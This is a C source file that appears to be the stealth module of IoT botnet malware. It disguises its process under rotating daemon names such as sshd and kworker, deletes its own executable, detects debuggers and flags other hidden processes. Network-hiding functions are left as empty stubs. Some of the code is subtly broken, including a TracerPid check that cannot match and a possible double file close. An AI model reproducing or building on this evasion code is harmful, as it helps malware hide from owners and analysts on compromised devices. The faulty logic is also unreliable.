#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "util.h"

#define MAX_PATH_LENGTH 256


static const char *legit_names[] = {
    "httpd",
    "lighttpd",
    "nginx",
    "apache",
    "boa",
    "uhttpd",
    "mini_httpd",
    "busybox",
    "dropbear",
    "sshd",
    "telnetd",
    "init",
    "systemd",
    "kthreadd",
    "ksoftirqd",
    "kswapd",
    "kworker"
};


void stealth_hide_process_name(void) {
    int pid = getpid();
    const char *name = legit_names[rand() % (sizeof(legit_names) / sizeof(legit_names[0]))];
    
    
    prctl(PR_SET_NAME, name);
    
    
    char cmd_path[64];
    snprintf(cmd_path, sizeof(cmd_path), "/proc/%d/cmdline", pid);
    int fd = open(cmd_path, O_WRONLY);
    if (fd != -1) {
        
        write(fd, name, strlen(name));
        write(fd, "\0", 1);
        close(fd);
    }
}


void stealth_unlink_exe(void) {
    char self_exe[4096];
    ssize_t len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len != -1) {
        self_exe[len] = '\0';
        
        unlink(self_exe);
    }
}


void stealth_rotate_name(void) {
    static time_t last_rotate = 0;
    time_t now = time(NULL);
    
    
    if (now - last_rotate > 300) {
        stealth_hide_process_name();
        last_rotate = now;
    }
}


BOOL stealth_is_hidden_process(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL && cmdline == NULL)
        return FALSE;
    
    const char *check_str = exe_path ? exe_path : cmdline;
    
    
    if (strstr(check_str, "(deleted)") != NULL) {
        
        if (strstr(check_str, "/lib/") == NULL &&
            strstr(check_str, "/usr/lib/") == NULL &&
            strstr(check_str, "/bin/") == NULL &&
            strstr(check_str, "/sbin/") == NULL &&
            strstr(check_str, "/usr/bin/") == NULL &&
            strstr(check_str, "/usr/sbin/") == NULL) {
            return TRUE; 
        }
    }
    
    
    if (cmdline != NULL && strlen(cmdline) > 0 && strlen(cmdline) < 5) {
        
        if (strstr(cmdline, "init") == NULL &&
            strstr(cmdline, "sh") == NULL &&
            strstr(cmdline, "ps") == NULL) {
            return TRUE;
        }
    }
    
    
    if (exe_path == NULL && cmdline != NULL && strlen(cmdline) > 0) {
        
        if (strstr(cmdline, "/usr/bin/") == NULL &&
            strstr(cmdline, "/bin/") == NULL &&
            strstr(cmdline, "/sbin/") == NULL &&
            strstr(cmdline, "/usr/sbin/") == NULL &&
            strstr(cmdline, "/lib/") == NULL) {
            
            return TRUE;
        }
    }
    
    
    if (exe_path != NULL && cmdline != NULL) {
        const char *legit_check[] = {"httpd", "nginx", "apache", "lighttpd", "sshd", "telnetd"};
        for (int i = 0; i < sizeof(legit_check) / sizeof(legit_check[0]); i++) {
            if (strstr(cmdline, legit_check[i]) != NULL || strstr(exe_path, legit_check[i]) != NULL) {
                
                
                if (strstr(exe_path, "/tmp/") != NULL ||
                    strstr(exe_path, "/var/tmp/") != NULL ||
                    strstr(exe_path, "/var/run/") != NULL ||
                    strstr(exe_path, "/root/") != NULL ||
                    strstr(exe_path, "/home/") != NULL ||
                    strstr(exe_path, "/dev/shm/") != NULL) {
                    return TRUE; 
                }
            }
        }
    }
    
    return FALSE;
}


BOOL stealth_has_mismatch(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL || cmdline == NULL || strlen(cmdline) == 0)
        return FALSE;
    
    
    const char *exe_basename = strrchr(exe_path, '/');
    if (exe_basename == NULL)
        exe_basename = exe_path;
    else
        exe_basename++; 
    
    
    char cmd_first[64] = {0};
    sscanf(cmdline, "%63s", cmd_first);
    
    
    if (strlen(exe_basename) > 0 && strlen(cmd_first) > 0) {
        if (strcmp(exe_basename, cmd_first) != 0) {
            
            if (strstr(cmdline, "busybox") == NULL &&
                strstr(cmdline, "sh") == NULL &&
                strstr(cmdline, "bash") == NULL) {
                return TRUE; 
            }
        }
    }
    
    return FALSE;
}


BOOL stealth_check_debugger(void) {
    
    FILE *status = fopen("/proc/self/status", "r");
    if (status != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), status) != NULL) {
            if (strncmp(line, "TracerPid:", 11) == 0) {
                int tracer_pid = atoi(line + 11);
                fclose(status);
                if (tracer_pid != 0) {
                    return TRUE; 
                }
                break;
            }
        }
        fclose(status);
    }
    
    
    
    
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        
        if (errno == EPERM) {
            
            
            return FALSE;
        }
        return TRUE; 
    }
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
    
    
    if (getenv("LD_PRELOAD") != NULL ||
        getenv("LD_AUDIT") != NULL ||
        getenv("GDB") != NULL ||
        getenv("STRACE") != NULL) {
        return TRUE;
    }
    
    return FALSE;
}


void stealth_hide_network(void) {
    
    
    
    
    
}


BOOL stealth_should_hide_connection(struct sockaddr_in *addr) {
    
    
    return FALSE; 
}
